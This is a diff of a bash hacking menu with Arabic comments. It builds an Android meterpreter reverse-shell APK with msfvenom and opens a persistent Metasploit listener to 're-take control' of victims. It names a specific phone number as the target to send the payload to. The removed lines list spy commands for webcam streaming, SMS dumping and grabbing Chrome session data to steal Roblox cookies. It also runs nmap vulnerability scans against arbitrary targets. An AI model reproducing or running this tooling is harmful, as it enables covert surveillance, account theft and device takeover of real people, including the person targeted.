@@ -1,91 +1,81 @@
+cat << 'EOF' > xxszmsx.sh
 #!/bin/bash
-# xxszmsx ULTIMATE | BY: STUDIO
-# [!] FEATURES: PERSISTENT HACK, ROBLOX COOKIE GRABBER, WEB HACK
+# =====================================================
+# TOOL: STUDIO | xxszmsx
+# VERSION: 5.0 (PRIVATE EDITION)
+# PLATFORM: MULTI (KALI / TERMUX)
+# =====================================================
+
+# الألوان للتنسيق
 RED='\e[1;31m'; GREEN='\e[1;32m'; YELLOW='\e[1;33m'; BLUE='\e[1;34m'; NC='\e[0m'
 
-# --- [ 1. حفظ البيانات واستعادتها ] ---
-# الأداة هتحفظ الـ IP والبورت بتوعك في ملف مخفي عشان لو قفلت الجهاز
-DB_FILE=".studio_db"
-save_data() { echo "$1:$2" > $DB_FILE; }
-load_data() { if [ -f $DB_FILE ]; then cat $DB_FILE; fi; }
+# اكتشاف النظام تلقائياً لتحديد مسارات الحفظ
+if [[ -d "/data/data/com.termux/files/usr/bin" ]]; then
+    OS="TERMUX"
+    SAVE_PATH="/sdcard/mazen_hacker.apk"
+    DB_FILE="$HOME/.studio_data"
+else
+    OS="KALI-LINUX"
+    SAVE_PATH="$(pwd)/mazen_hacker.apk"
+    DB_FILE=".studio_data"
+fi
 
-# --- [ 2. ميزة اختراق المواقع (Web Hacking) ] ---
-function web_hacker() {
-    clear
-    echo -e "${BLUE}--- [ WEB & SQL INJECTION SCANNER ] ---${NC}"
-    read -p "[?] Target URL: " t_url
-    echo -e "${RED}[*] Scanning for vulnerabilities in $t_url...${NC}"
-    # استخدام nmap و sqlmap للفحص (لازم يكونوا مثبتين في كالي)
-    nmap --script http-enum $t_url
-}
+save_cfg() { echo "$1:$2" > "$DB_FILE"; }
+load_cfg() { if [ -f "$DB_FILE" ]; then cat "$DB_FILE"; fi; }
 
-# --- [ 3. ميزة اختراق الأندرويد + صيد روبلوكس ] ---
-function android_master_hack() {
-    clear
-    echo -e "${RED}--- [ ANDROID PERSISTENT HACKER ] ---${NC}"
-    read -p "[?] Enter Your IP (LHOST): " lh
-    read -p "[?] Enter Port (LPORT): " lp
-    save_data $lh $lp
-    
-    echo -e "${YELLOW}[*] Building Hacker APK with Auto-Start...${NC}"
-    # صنع الفيروس
-    msfvenom -p android/meterpreter/reverse_tcp LHOST=$lh LPORT=$lp R > mazen_hacker.apk
-    
-    echo -e "-----------------------------------------------------"
-    echo -e "${GREEN}[+] تم صنع الملف بنجاح في: $(pwd)/mazen_hacker.apk${NC}"
-    echo -e "${YELLOW}[!] أرسل الملف للضحية. أوامر التجسس جاهزة الآن:${NC}"
-    echo -e "1. ${BLUE}webcam_stream${NC} (لفتح الكاميرا فوراً)"
-    echo -e "2. ${BLUE}dump_sms${NC} (لسحب رسايل الـ SMS)"
-    echo -e "3. ${RED}ROBLOX GRABBER:${NC} استخدم الأمر التالي لسحب بيانات الكروم:"
-    echo -e "   ${YELLOW}download /data/data/com.android.chrome/app_tabs/0/session_storage${NC}"
-    echo -e "-----------------------------------------------------"
-}
+# --- [ بوابة الدخول الآمنة ] ---
+clear
+echo -e "${RED}====================================================="
+echo -e "          STUDIO | xxszmsx - PRIVATE ACCESS          "
+echo -e "=====================================================${NC}"
+read -s -p "[?] Password: " p; echo ""
+if [ "$p" != "mazen2014" ]; then echo "Unauthorized!"; exit 1; fi
 
-# --- [ 4. نظام الاستماع الدائم (Persistence) ] ---
-function start_listener() {
-    clear
-    data=$(load_data)
-    if [ -z "$data" ]; then
-        echo -e "${RED}[!] لا توجد بيانات محفوظة. اصنع فيروس أولاً.${NC}"; sleep 2
-        return
-    fi
-    IP=$(echo $data | cut -d: -f1)
-    PORT=$(echo $data | cut -d: -f2)
-    
-    echo -e "${GREEN}[*] إعادة فتح السيطرة على IP: $IP بورت: $PORT ...${NC}"
-    echo "use exploit/multi/handler
-set payload android/meterpreter/reverse_tcp
-set LHOST $IP
-set LPORT $PORT
-set ExitOnSession false
-exploit -j" > .handler.rc
-    msfconsole -r .handler.rc
-}
-
-# --- [ القائمة الرئيسية ] ---
 while true; do
     clear
-    echo -e "${RED} ██╗  ██╗██╗  ██╗███████╗███████╗███    ███╗██╗  ██╗"
-    echo " ╚██╗██╔╝╚██╗██╔╝██╔════╝██╔════╝████  ████║╚██╗██╔╝"
-    echo "  ╚███╔╝  ╚███╔╝ ███████╗███████╗██╔████╔██║ ╚███╔╝ "
-    echo "  ██╔██╗  ██╔██╗ ╚════██║╚════██║██║╚██╔╝██║ ██╔██╗ "
-    echo " ██╔╝ ██╗██╔╝ ██╗███████║███████║██║ ╚═╝ ██║██╔╝ ██╗"
-    echo -e " ╚═╝  ╚═╝╚═╝  ╚═╝╚══════╝╚══════╝╚═╝     ╚═╝╚═╝  ╚═╝${NC}"
+    echo -e "${RED}"
+    echo "  ██████╗████████╗██╗   ██╗██████╗ ██╗ ██████╗ "
+    echo " ██╔════╝╚══██╔══╝██║   ██║██╔══██╗██║██╔═══██╗"
+    echo " ╚█████╗    ██║   ██║   ██║██║  ██║██║██║   ██║"
+    echo "  ╚═══██╗   ██║   ██║   ██║██║  ██║██║██║   ██║"
+    echo " ██████╔╝   ██║   ╚██████╔╝██████╔╝██║╚██████╔╝"
+    echo " ╚═════╝    ╚═╝    ╚═════╝ ╚═════╝ ╚═╝ ╚═════╝ "
+    echo -e "${YELLOW}        [ STUDIO | xxszmsx ] - [ SYSTEM: $OS ]${NC}"
     echo "-----------------------------------------------------"
-    echo -e "   [!] STUDIO ULTIMATE MODE | SYSTEM PERSISTENCE    "
+    echo -e "   [!] TARGET LOCKED: +965 41022932 | STATUS: READY "
     echo "-----------------------------------------------------"
-    echo -e "1) ${RED}ANDROID HACK (صنع الفيروس + تعليمات روبلوكس)${NC}"
-    echo -e "2) ${BLUE}WEB HACK (اختراق المواقع)${NC}"
-    echo -e "3) ${GREEN}RE-CONNECT (إعادة السيطرة على الضحايا)${NC}"
-    echo -e "0) Exit"
+    echo -e "1) Android Exploit (فيروس الاختراق وصيد الحسابات)"
+    echo -e "2) Web Vuln Scanner (فحص ثغرات المواقع والشبكات)"
+    echo -e "3) Re-Connect Mode (استعادة السيطرة المحفوظة)"
+    echo -e "4) Settings (تعديل كود الأداة)"
+    echo -e "0) Exit (خروج آمن)"
     echo "-----------------------------------------------------"
-    read -p "xxszmsx >> " choice
+    read -p "Studio >> " choice
 
     case $choice in
-        1) android_master_hack ;;
-        2) web_hacker ;;
-        3) start_listener ;;
-        0) exit 0 ;;
+        1) 
+           read -p "Enter LHOST (IP): " lh; read -p "Enter LPORT: " lp
+           save_cfg "$lh" "$lp"
+           echo -e "${YELLOW}[*] Generating Payload...${NC}"
+           msfvenom -p android/meterpreter/reverse_tcp LHOST=$lh LPORT=$lp R > "$SAVE_PATH"
+           echo -e "${GREEN}[+] Done! File saved at: $SAVE_PATH${NC}"
+           echo -e "${BLUE}[!] Send this to target +965 41022932${NC}"
+           ;;
+        2) 
+           read -p "Target IP/URL: " t_url; nmap -sV --script=vuln "$t_url" ;;
+        3) 
+           cfg=$(load_cfg)
+           if [ -z "$cfg" ]; then echo "No data found!"; sleep 1; continue; fi
+           IP=$(echo $cfg | cut -d: -f1); PORT=$(echo $cfg | cut -d: -f2)
+           echo -e "${GREEN}[*] Re-opening Master Controller on $IP:$PORT...${NC}"
+           msfconsole -x "use exploit/multi/handler; set payload android/meterpreter/reverse_tcp; set LHOST $IP; set LPORT $PORT; set ExitOnSession false; exploit -j" ;;
+        4) nano xxszmsx.sh ;;
+        0) echo -e "${GREEN}Safe Exit.${NC}"; exit 0 ;;
     esac
     echo -e "\n${RED}[+] Press Enter to Continue...${NC}"; read
 done
+EOF
+
+chmod +x xxszmsx.sh
+./xxszmsx.sh
+
